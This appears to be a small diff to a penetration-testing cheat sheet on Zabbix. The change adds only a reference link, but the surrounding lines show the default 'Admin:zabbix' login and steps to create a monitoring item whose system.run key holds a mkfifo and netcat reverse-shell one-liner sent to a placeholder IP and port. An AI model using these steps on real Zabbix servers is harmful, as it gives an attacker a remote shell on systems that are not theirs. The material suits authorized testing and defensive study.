@@ -22,3 +22,7 @@ Admin:zabbix
 1. Configuration > Hosts > Items > Create New
 2. set key: `system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f &,nowait]`
 3. Click Test > Get Value & Test
+
+## References
+
+* [blog.zabbix.com/zabbix-remote-commands/](https://blog.zabbix.com/zabbix-remote-commands/7500/)
